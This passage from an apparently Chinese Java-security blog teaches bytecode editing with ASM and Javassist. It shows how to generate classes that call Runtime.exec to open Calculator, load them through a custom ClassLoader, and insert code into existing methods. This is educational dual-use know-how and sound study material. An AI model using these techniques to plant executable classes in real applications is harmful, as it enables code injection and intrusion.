class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// 压入方法进入(onMethodEnter)时存入到局部变量的var2值到栈顶</span></span><br><span class="line">                                loadLocal(newArgIndex);</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// 返回一个引用类型, 即栈顶的var2字符串, return var2;</span></span><br><span class="line">                                <span class="comment">// 需要特别注意, 不同数据类型应当使用不同的RETURN指令</span></span><br><span class="line">                                mv.visitInsn(ARETURN);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;, ClassReader.EXPAND_FRAMES);</span><br><span class="line"></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/JavaSecCode/src/main/java/org/example/asm/demo/BytecodeModMethodAdapterTest.class&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] updateByte = classWriter.toByteArray();</span><br><span class="line">            fileOutputStream.write(updateByte);</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ASMClassVisitor</span> <span class="variable">asmClassVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ASMClassVisitor</span>();</span><br><span class="line">            <span class="type">ClassReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(updateByte);</span><br><span class="line">            System.out.println(<span class="string">&quot;解析类名: &quot;</span> + reader.getClassName() + <span class="string">&quot;，父类: &quot;</span> + reader.getSuperName() + <span class="string">&quot;，实现接口: &quot;</span> + Arrays.toString(reader.getInterfaces()));</span><br><span class="line">            System.out.println(<span class="string">&quot;-----------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">            reader.accept(asmClassVisitor, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708266155944-5b0f4f47-4fdb-4fa0-8418-a74bf87b985f.png"></p><h5 id="动态生成字节码"><a href="#动态生成字节码" class="headerlink" title="动态生成字节码"></a>动态生成字节码</h5><p><font style="color:rgb(51, 51, 51);">可以使用</font><font style="color:rgb(51, 51, 51);">ClassWriter</font><font style="color:rgb(51, 51, 51);">来动态创建出一个</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">类的二进制文件，然后通过自定义的类加载器就可以将动态生成的类加载到</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">中。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 需要动态生成的示例代码</span></span><br><span class="line"><span class="keyword">package</span> org.example.asm.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BytecodeCalculatorTest</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span> &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用ClassWriter生成类字节码</span></span><br><span class="line"><span class="keyword">package</span> org.example.asm.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.Opcodes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ASMBytecodeCalculatorMain</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;org.example.asm.demo.BytecodeCalculatorTest&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CLASS_NAME_ASM</span> <span class="operator">=</span> <span class="string">&quot;org/example/asm/demo/BytecodeCalculatorTest&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] dump() &#123;</span><br><span class="line">        <span class="comment">// 创建ClassWriter用于生成类字节码</span></span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">cw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 创建MethodVisitor</span></span><br><span class="line">        MethodVisitor mv;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个字节码版本为JDK1.8的org.example.asm.demo.BytecodeCalculatorTest类</span></span><br><span class="line">        cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC + Opcodes.ACC_SUPER, CLASS_NAME_ASM, <span class="literal">null</span>, <span class="string">&quot;java/lang/Object&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 设置源码文件名</span></span><br><span class="line">        cw.visitSource(<span class="string">&quot;BytecodeCalculatorTest.java&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建默认的构造函数</span></span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">constructor</span> <span class="operator">=</span> cw.visitMethod(Opcodes.ACC_PUBLIC, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        constructor.visitCode();</span><br><span class="line">        constructor.visitVarInsn(Opcodes.ALOAD, <span class="number">0</span>);</span><br><span class="line">        constructor.visitMethodInsn(Opcodes.INVOKESPECIAL, <span class="string">&quot;java/lang/Object&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        constructor.visitInsn(Opcodes.RETURN);</span><br><span class="line">        constructor.visitMaxs(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        constructor.visitEnd();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建execute方法</span></span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">executeMethod</span> <span class="operator">=</span> cw.visitMethod(Opcodes.ACC_PUBLIC + Opcodes.ACC_STATIC, <span class="string">&quot;execute&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        executeMethod.visitCode();</span><br><span class="line">        executeMethod.visitMethodInsn(Opcodes.INVOKESTATIC, <span class="string">&quot;java/lang/Runtime&quot;</span>, <span class="string">&quot;getRuntime&quot;</span>, <span class="string">&quot;()Ljava/lang/Runtime;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        executeMethod.visitLdcInsn(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        executeMethod.visitMethodInsn(Opcodes.INVOKEVIRTUAL, <span class="string">&quot;java/lang/Runtime&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/Process;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        executeMethod.visitInsn(Opcodes.POP);</span><br><span class="line">        executeMethod.visitInsn(Opcodes.RETURN);</span><br><span class="line">        executeMethod.visitMaxs(<span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">        executeMethod.visitEnd();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 完成类的构造</span></span><br><span class="line">        cw.visitEnd();</span><br><span class="line">        <span class="comment">// 获取生成的类的字节码数组</span></span><br><span class="line">        <span class="keyword">return</span> cw.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = dump();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建自定义类加载器, 加载ASM创建的类字节码到JVM</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>(ASMBytecodeCalculatorMain.class.getClassLoader()) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    <span class="keyword">return</span> defineClass(CLASS_NAME, classBytes, <span class="number">0</span>, classBytes.length);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射调用通过ASM生成的BytecodeCalculatorTest类的execute方法</span></span><br><span class="line">        classLoader.loadClass(CLASS_NAME).getMethod(<span class="string">&quot;execute&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708267501928-a7248c3a-2ead-477a-a047-b528fffb3822.png"></p><h3 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h3><p>Javassist是一个开源的分析、编辑和创建Java字节码的类库；相比ASM，Javassist提供了更加简单便捷的API，使用Javassist可以像写Java代码一样直接插入Java代码片段，不再需要关注Java底层的字节码的和栈操作，仅需要学会如何使用Javassist的API即可实现字节码编辑。官方教程：<a href="https://www.javassist.org/tutorial/tutorial.html">Getting Started with Javassist</a>。</p><h4 id="API和标识符"><a href="#API和标识符" class="headerlink" title="API和标识符"></a>API和标识符</h4><p>Javassist中提供了很多类似于Java反射机制的API。</p><table><thead><tr><th><strong><font style="color:rgb(51, 51, 51);">类</font></strong></th><th><strong><font style="color:rgb(51, 51, 51);">描述</font></strong></th></tr></thead><tbody><tr><td><font style="color:rgb(51, 51, 51);">ClassPool</font></td><td><font style="color:rgb(51, 51, 51);">ClassPool是一个存储CtClass的容器，如果调用</font><font style="background-color:rgb(247, 247, 247);">get</font><font style="color:rgb(51, 51, 51);">方法会搜索并创建一个表示该类的CtClass对象</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">CtClass</font></td><td><font style="color:rgb(51, 51, 51);">CtClass表示的是从ClassPool获取的类对象，可对该类就行读写编辑等操作</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">CtMethod</font></td><td><font style="color:rgb(51, 51, 51);">可读写的类方法对象</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">CtConstructor</font></td><td><font style="color:rgb(51, 51, 51);">可读写的类构造方法对象</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">CtField</font></td><td><font style="color:rgb(51, 51, 51);">可读写的类成员变量对象</font></td></tr></tbody></table><p><font style="color:rgb(51, 51, 51);">Javassist</font><font style="color:rgb(51, 51, 51);">使用了内置的标识符来表示一些特定的含义，例如，</font><font style="color:rgb(51, 51, 51);">$_</font><font style="color:rgb(51, 51, 51);">表示返回值，可以在动态插入类代码的时候使用这些特殊的标识符来表示对应的对象。</font></p><table><thead><tr><th><strong><font style="color:rgb(51, 51, 51);">表达式</font></strong></th><th><strong><font style="color:rgb(51, 51, 51);">描述</font></strong></th></tr></thead><tbody><tr><td>$0, $1, $2, …</td><td>this<font style="color:rgb(51, 51, 51);">和方法参数</font></td></tr><tr><td>$args</td><td>Object[]<font style="color:rgb(51, 51, 51);">类型的参数数组</font></td></tr><tr><td>$$</td><td><font style="color:rgb(51, 51, 51);">所有的参数，如</font>m($$)<font style="color:rgb(51, 51, 51);">等价于</font>m($1,$2,…)</td></tr><tr><td>$cflow(…)</td><td><font style="color:rgb(51, 51, 51);">cflow变量</font></td></tr><tr><td>$r</td><td><font style="color:rgb(51, 51, 51);">返回类型，用于类型转换</font></td></tr><tr><td>$w</td><td><font style="color:rgb(51, 51, 51);">包装类型，用于类型转换</font></td></tr><tr><td>$_</td><td><font style="color:rgb(51, 51, 51);">方法返回值</font></td></tr><tr><td>$sig</td><td><font style="color:rgb(51, 51, 51);">方法签名，返回</font>java.lang.Class[]<font style="color:rgb(51, 51, 51);">数组类型</font></td></tr><tr><td>$type</td><td><font style="color:rgb(51, 51, 51);">返回值类型，</font>java.lang.Class<font style="color:rgb(51, 51, 51);">类型</font></td></tr><tr><td>$class</td><td><font style="color:rgb(51, 51, 51);">当前类，</font>java.lang.Class<font style="color:rgb(51, 51, 51);">类型</font></td></tr></tbody></table><h4 id="生成字节码"><a href="#生成字节码" class="headerlink" title="生成字节码"></a>生成字节码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.bytecode.javassist.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavassistTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;org.example.bytecode.javassist.demo.JavassistCalculatorTest&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 给ctClass类添加一个string类型的字段为name并初始化该字段</span></span><br><span class="line">            <span class="type">CtField</span> <span class="variable">ctField</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(classPool.get(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;name&quot;</span>, ctClass);</span><br><span class="line">            ctField.setModifiers(Modifier.PRIVATE);</span><br><span class="line">            ctClass.addField(ctField, CtField.Initializer.constant(<span class="string">&quot;H3rmesk1t&quot;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 生成对应的get/set方法</span></span><br><span class="line">            ctClass.addMethod(CtNewMethod.getter(<span class="string">&quot;getName&quot;</span>, ctField));</span><br><span class="line">            ctClass.addMethod(CtNewMethod.setter(<span class="string">&quot;setName&quot;</span>, ctField));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加无参构造函数</span></span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">            ctConstructor.setBody(<span class="string">&quot;&#123;name = \&quot;AlphaG0\&quot;;&#125;&quot;</span>);</span><br><span class="line">            ctClass.addConstructor(ctConstructor);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加有参构造函数</span></span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">ctConstructor1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;classPool.get(<span class="string">&quot;java.lang.String&quot;</span>)&#125;, ctClass);</span><br><span class="line">            ctConstructor1.setBody(<span class="string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);</span><br><span class="line">            ctClass.addConstructor(ctConstructor1);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加Main函数</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtMethod.make(<span class="string">&quot;public static void main(String[] args) &#123; Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 写入class文件</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/JavaSecCode/src/main/java/org/example/bytecode/javassist/JavassistCalculatorTest.class&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] updateByte = ctClass.toBytecode();</span><br><span class="line">            fileOutputStream.write(updateByte);</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708273805127-1b7e0584-523e-435a-a37d-9b0a7261bb83.png"></p><h4 id="读取类-成员变量-方法信息"><a href="#读取类-成员变量-方法信息" class="headerlink" title="读取类&amp;成员变量&amp;方法信息"></a>读取类&amp;成员变量&amp;方法信息</h4><p><font style="color:rgb(51, 51, 51);">Javassist</font><font style="color:rgb(51, 51, 51);">读取类信息非常简单，使用</font><font style="color:rgb(51, 51, 51);">ClassPool</font><font style="color:rgb(51, 51, 51);">对象获取到</font><font style="color:rgb(51, 51, 51);">CtClass</font><font style="color:rgb(51, 51, 51);">对象后就可以像使用</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">反射</font><font style="color:rgb(51, 51, 51);">API</font><font style="color:rgb(51, 51, 51);">一样去读取类信息。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.bytecode.javassist.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavassistClassAccessTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建ClassPool对象</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;org.example.bytecode.javassist.demo.JavassistCalculatorTest&quot;</span>);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;解析类名: &quot;</span> + ctClass.getName() + <span class="string">&quot;\t 父类: &quot;</span> + ctClass.getSuperclass().getName() + <span class="string">&quot;\t 实现接口: &quot;</span> + Arrays.toString(ctClass.getInterfaces()));</span><br><span class="line">            System.out.println(<span class="string">&quot;-----------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取所有的构造方法</span></span><br><span class="line">            CtConstructor[] ctConstructors = ctClass.getDeclaredConstructors();</span><br><span class="line">            <span class="comment">// 获取所有的成员变量</span></span><br><span class="line">            CtField[] ctFields = ctClass.getDeclaredFields();</span><br><span class="line">            <span class="comment">// 获取所有的成员方法</span></span><br><span class="line">            CtMethod[] ctMethods = ctClass.getDeclaredMethods();</span><br><span class="line">            <span class="comment">// 输出所有的构造方法</span></span><br><span class="line">            <span class="keyword">for</span> (CtConstructor ctConstructor : ctConstructors) &#123;</span><br><span class="line">                System.out.println(ctConstructor.getMethodInfo());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;-----------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">            <span class="comment">// 输出所有成员变量</span></span><br><span class="line">            <span class="keyword">for</span> (CtField ctField : ctFields) &#123;</span><br><span class="line">                System.out.println(ctField);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;-----------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">            <span class="comment">// 输出所有的成员方法</span></span><br><span class="line">            <span class="keyword">for</span> (CtMethod ctMethod : ctMethods) &#123;</span><br><span class="line">                System.out.println(ctMethod);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708274302912-7cb8385c-1ace-41f6-a23c-cbfe95163868.png"></p><h4 id="修改类方法"><a href="#修改类方法" class="headerlink" title="修改类方法"></a>修改类方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.bytecode.javassist.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavassistClassModifyTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;org.example.bytecode.javassist.demo.JavassistCalculatorTest&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">mainMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;main&quot;</span>, <span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;classPool.get(<span class="string">&quot;java.lang.String[]&quot;</span>)&#125;);</span><br><span class="line">            mainMethod.insertBefore(<span class="string">&quot;System.out.println(\&quot;Start...\&quot;);&quot;</span>);</span><br><span class="line">            mainMethod.insertAfter(<span class="string">&quot;System.out.println(\&quot;End...\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ctClass.toClass().newInstance();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">main</span> <span class="operator">=</span> o.getClass().getMethod(<span class="string">&quot;main&quot;</span>, String[].class);</span><br><span class="line">            main.invoke(o, (Object) <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708277536181-31cea8e4-d52b-44c6-a651-4c7d36972626.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射机制</title>
      <link href="/2023/03/13/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
      <url>/2023/03/13/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
      
